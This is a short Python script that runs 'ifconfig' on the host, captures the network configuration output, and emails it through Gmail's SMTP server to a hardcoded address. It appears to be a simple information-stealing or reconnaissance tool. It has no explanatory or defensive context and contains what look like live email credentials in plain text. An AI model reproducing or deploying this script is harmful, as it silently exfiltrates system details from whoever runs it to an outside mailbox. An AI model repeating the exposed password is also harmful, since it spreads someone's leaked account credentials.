import subprocess,smtplib

def send_mail(email,password,message):
	server=smtplib.SMTP("smtp.gmail.com",587)
	server.starttls()
	server.login(email,password)
	server.sendmail(email,email,message)
	server.quit()

	
command="ifconfig"
ans=subprocess.check_output(command,shell=True)
send_mail("malviyamalviya27@gmail.com","#52548malviya",ans)






